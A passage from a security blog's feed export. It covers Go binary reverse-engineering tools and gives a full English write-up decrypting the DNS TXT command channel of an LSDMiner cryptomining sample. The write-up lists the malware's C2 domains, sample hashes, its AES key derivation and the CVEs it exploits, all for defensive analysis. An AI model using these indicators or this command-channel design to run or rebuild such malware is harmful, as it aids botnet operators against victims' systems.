<p>另外，还有一个非典型的 Go 二进制文件解析工具：基于 <strong><a href="https://go-re.tk/gore/" target="_blank" rel="external">GoRE</a></strong> 的 <strong><a href="https://go-re.tk/redress/" target="_blank" rel="external">redress</a></strong>。 GoRE 是一个 Go 语言编写的 Go 二进制文件解析库，<strong>redress</strong> 是基于这个库来实现的 Go 二进制文件解析的 <strong>命令行工具</strong>。redress 的强大之处，可以<strong>结构化</strong>打印 Go 二进制文件中各种详细信息，比如打印 Go 二进制文件中的一些 Interface 定义：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">$ redress -<span class="keyword">interface</span> pplauncher</div><div class="line"><span class="keyword">type</span> error <span class="keyword">interface</span> &#123;</div><div class="line">	Error() <span class="keyword">string</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> <span class="keyword">interface</span> &#123;&#125; <span class="keyword">interface</span>&#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> route.Addr <span class="keyword">interface</span> &#123;</div><div class="line">	Family() <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> route.Message <span class="keyword">interface</span> &#123;</div><div class="line">	Sys() []route.Sys</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> route.Sys <span class="keyword">interface</span> &#123;</div><div class="line">	SysType() <span class="keyword">int</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> route.binaryByteOrder <span class="keyword">interface</span> &#123;</div><div class="line">	PutUint16([]<span class="keyword">uint8</span>, <span class="keyword">uint16</span>)</div><div class="line">	PutUint32([]<span class="keyword">uint8</span>, <span class="keyword">uint32</span>)</div><div class="line">	Uint16([]<span class="keyword">uint8</span>) <span class="keyword">uint16</span></div><div class="line">	Uint32([]<span class="keyword">uint8</span>) <span class="keyword">uint32</span></div><div class="line">	Uint64([]<span class="keyword">uint8</span>) <span class="keyword">uint64</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>或者打印 Go 二进制文件中的一些 Struct 定义以及绑定的方法定义：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$ redress -<span class="keyword">struct</span> -method pplauncher</div><div class="line"><span class="keyword">type</span> main.asset <span class="keyword">struct</span>&#123;</div><div class="line">	bytes []<span class="keyword">uint8</span></div><div class="line">	info os.FileInfo</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> main.bindataFileInfo <span class="keyword">struct</span>&#123;</div><div class="line">	name <span class="keyword">string</span></div><div class="line">	size <span class="keyword">int64</span></div><div class="line">	mode <span class="keyword">uint32</span></div><div class="line">	modTime time.Time</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(main.bindataFileInfo)</span> <span class="title">IsDir</span><span class="params">()</span> <span class="title">bool</span></span></div><div class="line"><span class="title">func</span> <span class="params">(main.bindataFileInfo)</span> <span class="title">ModTime</span><span class="params">()</span> <span class="title">time</span>.<span class="title">Time</span></div><div class="line"><span class="title">func</span> <span class="params">(main.bindataFileInfo)</span> <span class="title">Mode</span><span class="params">()</span> <span class="title">uint32</span></div><div class="line"><span class="title">func</span> <span class="params">(main.bindataFileInfo)</span> <span class="title">Name</span><span class="params">()</span> <span class="title">string</span></div><div class="line"><span class="title">func</span> <span class="params">(main.bindataFileInfo)</span> <span class="title">Size</span><span class="params">()</span> <span class="title">int64</span></div><div class="line"><span class="title">func</span> <span class="params">(main.bindataFileInfo)</span> <span class="title">Sys</span><span class="params">()</span> <span class="title">interface</span> &#123;&#125;</div><div class="line"></div><div class="line"><span class="keyword">type</span> main.bintree <span class="keyword">struct</span>&#123;</div><div class="line">	Func <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="params">(*main.asset, error)</span></span></div><div class="line">	<span class="title">Children</span> <span class="title">map</span>[<span class="title">string</span>]*<span class="title">main</span>.<span class="title">bintree</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这些能力，都是上面列举的反汇编工具的插件难以实现的。另外，用 Go 语言来实现这种工具有天然的优势：可以复用 Go 语言开源的底层代码中解析各种基础数据结构的能力。比如可以借鉴 <a href="https://golang.org/src/debug/gosym/pclntab.go" target="_blank" rel="external">src/debug/gosym/pclntab.go</a> 中的代码来解析 <strong>pclntab</strong> 结构，可以借鉴 <a href="https://golang.org/src/runtime/symtab.go" target="_blank" rel="external">src/runtime/symtab.go</a> 中的代码来解析 <strong>moduledata</strong> 结构，以及借鉴 <a href="https://golang.org/src/reflect/type.go" target="_blank" rel="external">src/reflect/type.go</a> 中的代码来解析各种数据类型的信息。</p>
<p><strong>redress</strong> 是一个接近极致的工具，它把逆向分析需要的信息尽可能地都解析到，并以友好的方式展示出来。但是它只是个命令行工具，跟反汇编工具的插件相比并不是很方便。另外，它目前还有个除 <strong>jeb-golang-analyzer</strong> 之外以上工具都有的缺点：限于内部实现的机制，<strong>无法解析 <code>buildmode=pie</code> 模式编译出来的二进制文件</strong>。用 redress 解析一个 <strong><a href="https://docs.google.com/document/d/1nr-TQHw_er6GOQRsF6T43GGhFDelrAP0NqSS_00RgZQ/edit?pli=1#heading=h.nidcdnrtrn3n" target="_blank" rel="external">PIE(Position Independent Executable)</a></strong> 二进制文件，报错如下：</p>
<p><img src="/imgs/go_re/redress_pie.png" alt=""></p>
<p>最后，是鄙人开发的一个 IDAPro 插件： <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> ，该工具除了拥有以上各工具的绝大部分功能(strings 解析暂时只支持 x86 架构的二进制文件，这一点不如 <strong>jeb-golang-analyzer</strong> 支持的丰富)，还<strong>支持对 PIE 二进制文件的解析</strong>。另外会把解析结果以更友好、更方便进一步操作的方式在 IDAPro 中展示。以 DDG 样本中一个复杂的结构体类型为例，解析结果如下：</p>
<p><img src="/imgs/go_re/go_parser.png" alt=""></p>
<h2 id="4-原理初探"><a href="#4-原理初探" class="headerlink" title="4. 原理初探"></a>4. 原理初探</h2><p>前文盘点了关于 Go 二进制文件解析的已有研究，原理层面都是一句带过。可能很多师傅看了会有两点疑惑：</p>
<ol>
<li>为什么 Go 二进制文件中会有这么多无法被 strip 掉的符号和类型信息？</li>
<li>具体有哪些可以解析并辅助逆向分析的信息？</li>
</ol>
<p>第一个问题，一句话解释就是，Go 二进制文件里打包进去了 <strong>runtime</strong> 和 <strong>GC</strong> 模块，还有独特的 <strong>Type Reflection</strong>(类型反射) 和 <strong>Stack Trace</strong> 机制，都需要用到这些信息。参考前文 <strong>redress</strong> 报错的配图，redress 本身也是 Go 语言编写，其报错时打出来的栈回溯信息，除了参数以及参数地址，还包含 pkg 路径、函数信息、类型信息、源码文件路径、以及在源码文件中的行数。</p>
<p>至于内置于 Go 二进制文件中的类型信息，主要为 Go 语言中的 Type Reflection 和类型转换服务。Go 语言内置的数据类型如下：</p>
<p><img src="/imgs/go_re/go_types.png" alt=""></p>
<p>而这些类型的底层实现，其实都基于一个底层的结构定义扩展而来：</p>
<p><img src="/imgs/go_re/go_rtype.png" alt=""></p>
<p>再加上 Go 允许为数据类型绑定方法，这样就可以定义更复杂的类型和数据结构。而这些类型在进行类型断言和反射时，都需要对这些底层结构进行解析。</p>
<p>第二个问题，对于 Go 二进制文件中，可以解析并对逆向分析分析有帮助的信息，我做了个列表，详情如下：</p>
<p><img src="/imgs/go_re/go_binary_info.png" alt=""></p>
<p>后文会以这张图为大纲，以  <strong><a href="https://github.com/0xjiayu/go_parser" target="_blank" rel="external">go_parser</a></strong> 为例，详细讲解如何查找、解析并有组织地展示出这些信息，尽最大可能提升 Go 二进制文件逆向分析的效率。</p>
<p>且看下回分解。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客： &lt;a href=&quot;https://www.anquanke.com/post/id/214940&quot;&gt;https://www.anquanke.com/post/id/214940&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1. 概述&quot;&gt;&lt;/a&gt;1. 概述&lt;/h2&gt;&lt;p&gt;Go 语言是一个比较新的强类型静态语言，2009 年由 Google 发布，在 2012 年才发布首个稳定版。Go 语言靠 Goroutine 和 channel、wait group、select、context 以及 sync 等辅助机制实现的 CSP 并发模型，以简洁高效编写高并发程序为亮点，很快就在全球范围内吸引大量开发者使用其编写各种程序。现在 Go 已成为云原生领域的首选开发语言。&lt;/p&gt;
&lt;p&gt;由于 Go 语言上手快，编码效率高，程序运行效率也高，而且很方便跨平台交叉编译，也吸引了恶意软件开发者的注意。渐渐地，安全厂商开始捕获到越来越多的 &lt;a href=&quot;https://unit42.paloaltonetworks.com/the-gopher-in-the-room-analysis-of-golang-malware-in-the-wild/&quot;&gt;Go 语言编写的恶意软件&lt;/a&gt; ，这些恶意软件横跨 Windows、Linux 和 Mac 三大平台。&lt;/p&gt;
&lt;p&gt;然而，Go 语言的编译工具链会全静态链接构建二进制文件，把标准库函数和第三方 package 全部做了静态编译，再加上 Go 二进制文件中还打包进去了 runtime 和 GC(Garbage Collection，垃圾回收) 模块代码，所以即使做了 strip 处理( &lt;code&gt;go build -ldflags &amp;quot;-s -w&amp;quot;&lt;/code&gt; )，生成的二进制文件体积仍然很大。在反汇编工具中打开 Go 语言二进制文件，可以看到里面包含动辄几千个函数。再加上 Go 语言的独特的函数调用约定、栈结构和多返回值机制，使得对 Go 二进制文件的分析，无论是静态逆向还是动态调式分析，都比分析普通的二进制程序要困难很多。&lt;/p&gt;
&lt;p&gt;不过，好消息是安全社区还是找到了针对性的方法，让安全分析人员对 Go 语言二进制文件的逆向变得更加轻松。最开始有人尝试过针对函数库做符号 Signature 来导入反汇编工具中，还原一部分二进制文件中的函数符号。后来有人研究出 Go 语言二进制文件内包含大量的运行时所需的符号和类型信息，以及字符串在 Go 二进制文件中独特的用法，然后开发出了针对性的符号甚至类型信息恢复工具。至此，对 Go 语言二进制文件的逆向分析工作，就变得轻松异常了。&lt;/p&gt;
&lt;p&gt;本系列文章将简单介绍 Go 语言二进制文件逆向姿势的发展历史，以及几个典型的恶意程序家族。然后详细介绍基于二进制文件内置的符号、类型信息来逆向分析 Go 语言二进制文件的技术原理和工具，最后以实际的分析案例演示前面介绍的工具和方法。至于还有人研究出&lt;a href=&quot;http://home.in.tum.de/~engelke/pubs/1709-ma.pdf&quot;&gt;基于符号执行和形式化定理证明&lt;/a&gt;的高深技术，来恢复 Go 语言二进制文件的符号和类型信息的姿势，不在本文讨论范围之内。&lt;del&gt;因为鄙人也没研究明白&lt;/del&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="security" scheme="http://jiayu0x.com/tags/security/"/>
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="golang" scheme="http://jiayu0x.com/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>Decrypt DNS TXT record data lookuped by latest LSDMiner sample</title>
    <link href="http://jiayu0x.com/2019/11/26/lsdminer_dnstxt_decrypt_en/"/>
    <id>http://jiayu0x.com/2019/11/26/lsdminer_dnstxt_decrypt_en/</id>
    <published>2019-11-25T16:00:00.000Z</published>
    <updated>2019-11-26T15:39:09.447Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>中文版： <a href="https://www.anquanke.com/post/id/193116" target="_blank" rel="external">逆向解密 LSDMiner 新样本利用 DNS TXT 通道传输的数据</a></p>
</blockquote>
<h2 id="1-Abstract"><a href="#1-Abstract" class="headerlink" title="1. Abstract"></a>1. Abstract</h2><p>My colleague sended me a latest LSDMiner sample(MD5:  <strong>114d76b774185b826830cb6b015cb56f</strong>) in mid-October. I noticed a DNS TXT and DoH(DNS over HTTPS) module with AES decryption by simple reverse engineering analysis. Then I moved on to something else without deep analysis. I got start to deal with this sample in the last few days, and found that Anomali has published a blog post about this case by Googling a function name used in the sample as <strong>NewAesCipher128()</strong> :</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/google_search.png" style="zoom:50%;"></p>
<p>Anomali’s blog post： <a href="https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect" target="_blank" rel="external">Illicit Cryptomining Threat Actor Rocke Changes Tactics, Now More Difficult to Detect</a></p>
<p>But Anomali Labs didn’t detail the process of DNS TXT record data decryption, that’s why I write this blog post.</p>
<a id="more"></a>
<p>This sample is still written in Go language as same as <a href="https://jiayu0x.com/2019/02/24/extract-compressed-files-by-static-analysis-in-watchdogsminer/">it’s old version</a>. But the coding architecture and functianlity internally has changed a lot, significant differences sumerized as below:</p>
<ul>
<li>Moves it’s malicious shell script from Pastebin to it’s own CC servers( <code>*.systemten.org</code> )</li>
<li>Integrates multiple exploits to speed and broaden it’s propagation</li>
<li>Transports multiple kinds of malicious encrypted data via DNS TXT record:<ul>
<li>Latest malicious shell script downloading URL for Cron job</li>
<li>Lastet version info</li>
<li>Latest malicious shell script</li>
<li>A group of downloading URLs of malicious binary files</li>
</ul>
</li>
</ul>
<p>Analysis of main aspects of this threat actor could be done by general approaches of threat analysis, and was covered by Anomali’s blog post. I will take <strong>114d76b774185b826830cb6b015cb56f</strong> as example to decribe details of decryption of DNS TXT record data received by this threat actor in this post.</p>
<h2 id="2-Overall-execution-flow"><a href="#2-Overall-execution-flow" class="headerlink" title="2. Overall execution flow"></a>2. Overall execution flow</h2><p>The overall execution flow could be sumeraized as 3 steps：</p>
<ol>
<li>Lookups DNS TXT record via DNS request or DoH, and decrypts the data with AES128bit to extract malicious URL for Cron job.</li>
<li>Scan current <em>/16</em> IP Block, and compromise alive hosts via 4 methods:<ul>
<li>SSH brute</li>
<li>Redis Unauthorized Access</li>
<li>Jekins RCE CVE-2019-1003000 Exploit</li>
<li>ActiveMQ RCE CVE-2016-3088 Exploit</li>
</ul>
</li>
<li>Release cryptomining program and  achieve persistence on the exploited machines</li>
</ol>
<p>By the way, the sample will also lookup the DNS TXT records to get malicious shell script and URL to download binary file at the 3rd step.</p>
<p>Firstly, let’s look at the overall process of lookuping DNS TXT record and tampering cron job:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/lookup_and_dec_dnstxt.png" alt=""></p>
<p>We can see that the sample lookups DNS TXT record from <code>cron.iap5u1rbety6vifaxsi9vovnc9jjay2l.com</code> and then decrypts the record data with AES-128bit. I lookuped this DNS TXT record with command <strong>dig</strong> as below:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/dns_txt_rec.png" alt=""></p>
<p>The response of DNS TXT request is a Base64 encoded string <em>A7PZtADnYAEMEArGhmA9xQihPq9TRz4QigssjeOmUnQ</em> , the codes in function <strong>github_com_hippies_LSD_LSDC__AesCipher128_Decrypt()</strong> is responsible for decoding this string:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/func_aescipher128_decrypt.png" style="zoom:60%;"></p>
<p>Taking all the factors above, we could come to conclusion that there’re 3 steps to accomplish the decryption task:</p>
<ol>
<li>Decodes the raw DNS TXT response string with Base64</li>
<li>Initialize the AES-128bit decryption handle</li>
<li>Decrypts the binary bytes generated by Base64 decoding with AES-128bit</li>
</ol>
<h2 id="3-Base64-Decoding"><a href="#3-Base64-Decoding" class="headerlink" title="3. Base64 Decoding"></a>3. Base64 Decoding</h2><p>Now I use command <strong>base64</strong> within Linux to decode the raw DNS TXT record response:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64_decode_fail.png" alt=""></p>
<p>It’s a bit odd that decoding failed. So I guess it’s not encoded by the <strong>standard</strong> Base64 encoding. Here are 2 points of background knowledge of Base64 encoding:</p>
<ol>
<li>There’re 2 encoding types for Base64: <strong>Standard Encoding</strong> and <strong>URL Encoding</strong>. The alphabet for Standard Encoding is <em>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</em> and <em>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_</em> for URL Encoding. (refer: <a href="https://tools.ietf.org/html/rfc4648" target="_blank" rel="external">RFC4648</a>)</li>
<li>The 2 types of Base64 encoding share the same default padding character, that is <strong>=</strong>. However they all could padd nothing.</li>
</ol>
<p>These 2 points has been shown at <a href="https://golang.org/pkg/encoding/base64/?m=all" target="_blank" rel="external">Go doc for Base64</a>:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/base64_godoc.png" alt=""></p>
<p>So, 2 kinds of padding style and 2 types of encoding, then there’re 4  subdivision types of Base64 encoding:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/different_type_encodings.png" alt=""></p>
<p>Then which kind of Base64 encoding dose LSDMiner use? We should check how the Base64 handler is initialized in this sample. As the screenshot picture shows below, the sample implements the decoding operation with Base64 encoding handler <strong>b64EncodingObj</strong> in function <strong>github_com_hippies_LSD_LSDC__AesCipher128_Decrypt()</strong>.</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/call_b64encodingobj.png" alt=""></p>
<p>And the Base64 encoding handler is initialized in function <strong>encoding_base64_init()</strong> as IDAPro xrefs demonstrates. Here is the detail of function <strong>encoding_base64_init()</strong> :</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64encoding_init.png" alt=""></p>
<p>Two key points：</p>
<ol>
<li>The sample passes URLEncodings alphabet to function <strong>base64.NewEncoding()</strong>, thus it uses URLEncoding style base64 encoding;</li>
<li>The samples passes <strong>-1</strong> to function <strong>base64.URLEncoding.WithPadding()</strong>, aka <strong>base64.NoPadding</strong>, thus <strong>base64.RawURLEncoding</strong>.</li>
</ol>
<p>Now I can decoding the DNS TXT record response string with these testing codes:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/b64_decode_test.png" alt=""></p>
<h2 id="4-AES-Decrytion"><a href="#4-AES-Decrytion" class="headerlink" title="4. AES Decrytion"></a>4. AES Decrytion</h2><p>We know that the sample will decrypt those binary data with AES-128bit decoded by Base64 encoding as metioned above. Then we should make 4 points clear at first to leverage AES algorithm correctly:</p>
<ul>
<li>AES Key</li>
<li>AES Initialization Vector(IV)</li>
<li>Encryption mode(CBC/ECB etc.)</li>
<li>Padding method</li>
</ul>
<p>According to analysis above, we can notice that the sample calls a function related to AES decryption named <strong>crypto_cipher_NewCBCDecrypter()</strong>, so we can confirm that the AES encryption mode is <strong><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_(CBC" target="_blank" rel="external">CBC</a>)</strong>.</p>
<p>Now we confirm other 3 points next by analyzing function <strong>NewAesCipher128()</strong> which initializes the AES decryption handler and  <strong>AesCipher128_Decrypt()</strong> which takes the decryption operation.</p>
<h3 id="4-1-function-NewAesCipher128"><a href="#4-1-function-NewAesCipher128" class="headerlink" title="4.1 function NewAesCipher128()"></a>4.1 function NewAesCipher128()</h3><p>Firstly, this function is passed to an argument, which is the domain name string that will be lookuped DNS TXT record. The domain name string for malicious cron job is <code>cron.iap5u1rbety6vifaxsi9vovnc9jjay2l.com</code>:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/call_newaescipher128.png" style="zoom:50%;"></p>
<p>Then this function initializes a <strong>crypto/md5</strong> digest handler, we can confirm this by comparing the standard Go library function <strong>crypto_md5_New()</strong> at the right side of the screenshot below:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/md5_init.png" alt=""></p>
<p>And the domain name string will be converted to byte slice and written to <strong>MD5 digest</strong> handler, then the sample executes the <strong>1rst round</strong> of MD5 hash calculation with <strong>md5.degets.Sum(nil)</strong>:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/first_round_md5_hash.png" style="zoom:55%;"></p>
<p>When the 1rst round MD5 hash value is calculated, it will be converted to 32-Bytes string by <strong>hex.EncodeToString()</strong>, that’s the normal MD5 hash string. And this MD5 value string is cut to two halves, the first half(16-Bytes) will be saved to variable which I name it as <strong>r1HashStr_16bytes</strong>:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/slice_r1hashstr.png" style="zoom:60%;"></p>
<p>The next step is the <strong>2nd round</strong> of MD5 hash calculation also by calling <strong>md5.degets.Sum(nil)</strong> without writing any bytes to the <strong>MD5 digest</strong>. This 2nd MD5 hash value will also be cut to two halves, but this time the 2nd half will be save to anather variable which I name it as <strong>r2HashStr_16bytes</strong>.</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/r2_md5_hash.png" style="zoom:60%;"></p>
<p>At last, we will see that the <strong>r1HashStr_16bytes</strong> is passed to function <strong>aes.NewCipher()</strong> as AES Key, to initialize AES decryption handler:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/init_aes_cipher.png" style="zoom:80%;"></p>
<p>And the <strong>r2HashStr_16bytes</strong> will be return by this function, and passed to later function <strong>AesCipher128_Decrypt()</strong>. <strong>AesCipher128_Decrypt()</strong> will call <strong>crypto_cipher_NewCBCDecrypter()</strong> , with this <strong>r2HashStr_16bytes</strong> as AES IV.</p>
<h3 id="4-2-AES-Padding-method"><a href="#4-2-AES-Padding-method" class="headerlink" title="4.2 AES Padding method"></a>4.2 AES Padding method</h3><p>After analyzing the AES encryption mode, AES Key and AES IV, we have the last key point left to decrypt the DNS TXT record correctly, that’s the <strong><a href="https://en.wikipedia.org/wiki/Padding_(cryptography" target="_blank" rel="external">Padding method</a>)</strong>. </p>
<p>And we can confirm that this sample uses simple ZeroPadding from function <strong>AesCipher128_Decrypt()</strong> , because it calls <strong>byte.Trim()</strong> after data decryption:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/unpadding.png" style="zoom:50%;"></p>
<h3 id="4-3-Additional-specification–-2-rounds-MD5-hash-calculation"><a href="#4-3-Additional-specification–-2-rounds-MD5-hash-calculation" class="headerlink" title="4.3 Additional specification– 2 rounds MD5 hash calculation"></a>4.3 Additional specification– 2 rounds MD5 hash calculation</h3><p>As metioned above, the sample takes <strong>2 Rounds of MD5 Calculation</strong> operation to generate AES Key and AES IV  separately. Anomali’s blog post metioned this process too. But there’s a unexpected problem due to Go programming language’s standard MD5 <strong>Sum()</strong> function: the two MD5 hash values of two rounds of calculation are equal.</p>
<p>I show this problem by this piece of codes:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/md5_test.png" style="zoom:60%;"></p>
<p>I’m not sure about this but whether by design or just due to the malware author’s misunderstanding about Go crypto/md5 libary. But this acctually could confuse malware researcher to consider two different MD5 hash values by two rounds of calculation.</p>
<h2 id="5-Complete-decryption"><a href="#5-Complete-decryption" class="headerlink" title="5. Complete decryption"></a>5. Complete decryption</h2><p>Based on the above analysis, we could write some code to complete the decryption work. My Go program has been uploaded to Github:</p>
<p> <a href="https://github.com/0xjiayu/LSDMiner_DNS_TXT_Decrypt" target="_blank" rel="external">https://github.com/0xjiayu/LSDMiner_DNS_TXT_Decrypt</a> </p>
<p>And that’s the show case：</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/aes_decrypt.png" alt=""></p>
<p>The current decrypted text is a domain name string: <strong><code>lsd.systemten.org</code></strong>, which is also the default value if the sample failed to lookup the DNS TXT record or failed to decrypt these data:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/return_decryption_result.png" style="zoom:80%;"></p>
<h2 id="6-Conclusion"><a href="#6-Conclusion" class="headerlink" title="6. Conclusion"></a>6. Conclusion</h2><p>The screenshot in the head of this blog post shows that the sample will jump to another code branch to get DNS TXT record from CloudFlare’s DNS Server via DoH(<a href="https://en.wikipedia.org/wiki/DNS_over_HTTPS" target="_blank" rel="external">DNS over HTTPS</a>), when  <strong>net.LookupTXT()</strong> failed.</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_req_1.png" alt=""></p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_via_cloudflare.png" alt=""></p>
<p>We can confirm this method also works correctly:</p>
<p><img src="/imgs/lsdminer_dnstxt_decrept/doh_test.png" alt=""></p>
<p>It will make this botnet more robust and flexible with the assistance of encrypted DNS TXT record and DoH. In view of the facts that the botnet has existed for a long time and updates continuesly, I think it should cause community’s attention.</p>
<p>I’ve metioned above that the sample transports other kinds of malicious encrypted data via DNS TXT record except for malicious cron URL. The process of lookuping DNS TXT record, decoding data with Base64 and decrypting data with AES-128bit are all the same. There’re more domain names and they all have been covered by my Go program uploaded to Github before:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&quot;update.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;shell.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;1x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;2x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;3x32.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;1x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;2x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div><div class="line">&quot;3x64.iap5u1rbety6vifaxsi9vovnc9jjay2l.com&quot;</div></pre></td></tr></table></figure>
<p>At last, I would add more details aboud the Packer of this LSDMiner family’s malicious binary files. Almost all of it’s binary files are packed by malformed UPX Packer, and the packer’s feature is not so distinctive to wirte detection rules easily. Besides, it’s packer’s Magic Number has always been changed. For example, the sample I analyze in this blog post(MD5: <strong>114d76b774185b826830cb6b015cb56f</strong>) gets packed with Magic Number <strong>0x2124922A</strong>, while another sample (MD5: <strong>78e3582c42824f17aba17feefb87ea5f</strong>) gets packed with Magic Number <strong>0x215E77F2</strong>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;中文版： &lt;a href=&quot;https://www.anquanke.com/post/id/193116&quot;&gt;逆向解密 LSDMiner 新样本利用 DNS TXT 通道传输的数据&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-Abstract&quot;&gt;&lt;a href=&quot;#1-Abstract&quot; class=&quot;headerlink&quot; title=&quot;1. Abstract&quot;&gt;&lt;/a&gt;1. Abstract&lt;/h2&gt;&lt;p&gt;My colleague sended me a latest LSDMiner sample(MD5:  &lt;strong&gt;114d76b774185b826830cb6b015cb56f&lt;/strong&gt;) in mid-October. I noticed a DNS TXT and DoH(DNS over HTTPS) module with AES decryption by simple reverse engineering analysis. Then I moved on to something else without deep analysis. I got start to deal with this sample in the last few days, and found that Anomali has published a blog post about this case by Googling a function name used in the sample as &lt;strong&gt;NewAesCipher128()&lt;/strong&gt; :&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/imgs/lsdminer_dnstxt_decrept/google_search.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Anomali’s blog post： &lt;a href=&quot;https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect&quot;&gt;Illicit Cryptomining Threat Actor Rocke Changes Tactics, Now More Difficult to Detect&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;But Anomali Labs didn’t detail the process of DNS TXT record data decryption, that’s why I write this blog post.&lt;/p&gt;
    
    </summary>
    
      <category term="security" scheme="http://jiayu0x.com/categories/security/"/>
    
    
      <category term="malwr" scheme="http://jiayu0x.com/tags/malwr/"/>
    
      <category term="re" scheme="http://jiayu0x.com/tags/re/"/>
    
      <category term="lsdminer" scheme="http://jiayu0x.com/tags/lsdminer/"/>
    
      <category term="aes" scheme="http://jiayu0x.com/tags/aes/"/>
    
      <category term="decrypt" scheme="http://jiayu0x.com/tags/decrypt/"/>
    
  </entry>
  
  <entry>
    <title>逆向解密 LSDMiner 新样本中 DNS TXT 通道传输的数据</title>
    <link href="http://jiayu0x.com/2019/11/22/decrypt-dns-txt-lsdminer/"/>
    <id>http://jiayu0x.com/2019/11/22/decrypt-dns-txt-lsdminer/</id>
    <published>2019-11-21T16:00:00.000Z</published>
    <updated>2019-11-26T15:30:46.178Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p><strong>本文首发于安全客，原文链接：</strong><br><a href="https://www.anquanke.com/post/id/193116" target="_blank" rel="external">https://www.anquanke.com/post/id/193116</a></p>
</blockquote>
